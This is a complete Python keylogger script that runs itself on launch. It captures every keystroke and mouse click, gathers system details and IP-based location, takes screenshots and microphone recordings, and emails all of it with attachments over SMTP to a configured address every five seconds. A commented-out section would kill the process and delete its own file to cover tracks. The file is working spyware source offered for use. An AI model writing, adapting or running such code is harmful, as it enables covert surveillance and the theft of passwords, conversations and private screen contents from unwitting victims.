import os
import platform
import socket
import time
import wave
import pyscreenshot
import sounddevice as sd
import geocoder
from pynput import keyboard, mouse
from dotenv import load_dotenv
from utils import (
    send_mail_with_attachment,
    get_wav_and_png_files,
    delete_wav_and_png_files,
)

load_dotenv()

SMTP_SERVER = os.getenv("SMTP_SERVER")
SMTP_PORT = os.getenv("SMTP_PORT")
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
EMAIL_CC = os.getenv("EMAIL_CC")
SEND_REPORT_EVERY = 5  # seconds
MAGIC_WORD = "STOP"


class KeyLogger:
    def __init__(
        self,
        time_interval,
        smtp_server,
        smtp_port,
        email_address,
        email_password,
        email_sender,
        email_receiver,
        cc,
        magic_word,
    ):
        self.interval = time_interval
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.email_address = email_address
        self.email_password = email_password
        self.email_sender = email_sender
        self.email_receiver = email_receiver
        self.cc = cc
        self.magic_word = magic_word
        self.log = "KeyLogger Started...\n"
        self.keyboard_listener = None
        self.mouse_listener = None
        self.word = ""

    def appendlog(self, string):
        if string:
            self.log = self.log + string

    def on_move(self, x, y):
        # current_move = f"\nMouse moved to {x} {y}"
        # self.appendlog(current_move)
        pass  # do nothing

    def on_click(self, x, y, button, pressed):
        current_click = f"\nMouse click at {x} {y} with button {button}"
        self.appendlog(current_click)

    def on_scroll(self, x, y, dx, dy):
        # current_scroll = f"\nMouse scrolled at {x} {y} with scroll distance {dx} {dy}"
        # self.appendlog(current_scroll)
        pass  # do nothing

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = f" {str(key)} "

        self.word = self.word + current_key
        self.appendlog(f"\nPressed key: {current_key}")

    def send_mail(self, message):
        send_mail_with_attachment(
            smtp_server=self.smtp_server,
            smtp_port=self.smtp_port,
            email_address=self.email_address,
            email_password=self.email_password,
            email_sender=self.email_sender,
            email_receiver=self.email_receiver,
            cc=self.cc,
            path_to_attachment=os.getcwd(),
            attachments=get_wav_and_png_files(),
            subject="Test keylogged - by F3000",
            body=message,
        )

    def report(self):
        self.send_mail(f"\n\n\n{self.log}")
        print(self.log)

    def cleanup(self):
        self.log = ""
        if self.keyboard_listener and self.keyboard_listener.running:
            self.keyboard_listener.stop()
        if self.mouse_listener and self.mouse_listener.running:
            self.mouse_listener.stop()
        self.word = ""
        delete_wav_and_png_files()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        processor = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog("\nSystem info:")
        self.appendlog(f"\nHostname = {hostname}")
        self.appendlog(f"\nIP = {ip}")
        self.appendlog(f"\nProcessor = {processor}")
        self.appendlog(f"\nSystem OS = {system}")
        self.appendlog(f"\nMachine architecture = {machine}")

    def get_location(self):
        location = geocoder.ip("me")

        self.appendlog("\nLocation info:")

        if location.ok:
            latitude, longitude = location.latlng
            city = location.city
            state = location.state
            country = location.country

            self.appendlog(f"\nGeo position = {latitude} {longitude}")
            self.appendlog(f"\nCity = {city}")
            self.appendlog(f"\nState = {state}")
            self.appendlog(f"\nCountry = {country}")
        else:
            self.appendlog("\nLocation not determined.")

    def microphone(self):
        fs = 44100
        channels = 1  # mono
        seconds = self.interval
        obj = wave.open(f"sound_{time.time()}.wav", "w")
        obj.setnchannels(channels)  # mono
        obj.setsampwidth(2)  # Sampling of 16 bit
        obj.setframerate(fs)
        myrecording = sd.rec(
            int(seconds * fs), samplerate=fs, channels=channels, dtype="int16"
        )
        sd.wait()
        obj.writeframesraw(myrecording)
        self.appendlog("\nmicrophone used.")

    def screenshot(self):
        img = pyscreenshot.grab()
        img.save(f"screenshot_{time.time()}.png")
        self.appendlog("\nscreenshot used.")

    def run(self):
        while True:
            self.system_information()
            self.get_location()

            self.keyboard_listener = keyboard.Listener(on_press=self.save_data)
            self.keyboard_listener.start()

            self.mouse_listener = mouse.Listener(
                on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll
            )
            self.mouse_listener.start()

            self.screenshot()
            self.microphone()

            # if os.name == "nt":
            #     try:
            #         pwd = os.path.abspath(os.getcwd())
            #         os.system("cd " + pwd)
            #         os.system("TASKKILL /F /IM " + os.path.basename(__file__))
            #         print("File was closed.")
            #         os.system("DEL " + os.path.basename(__file__))
            #     except OSError:
            #         print("File is close.")
            # else:
            #     try:
            #         pwd = os.path.abspath(os.getcwd())
            #         os.system("cd " + pwd)
            #         os.system("pkill leafpad")
            #         os.system("chattr -i " + os.path.basename(__file__))
            #         print("File was closed.")
            #         os.system("rm -rf" + os.path.basename(__file__))
            #     except OSError:
            #         print("File is close.")

            time.sleep(self.interval)
            self.report()

            if self.magic_word != "" and self.magic_word in self.word:
                break

            self.cleanup()  # this cleanup is used until the while loop works
        self.cleanup()  # this cleanup is used when the while loop stops


keylogger = KeyLogger(
    SEND_REPORT_EVERY,
    SMTP_SERVER,
    SMTP_PORT,
    EMAIL_ADDRESS,
    EMAIL_PASSWORD,
    EMAIL_SENDER,
    EMAIL_RECEIVER,
    EMAIL_CC,
    MAGIC_WORD,
)
keylogger.run()
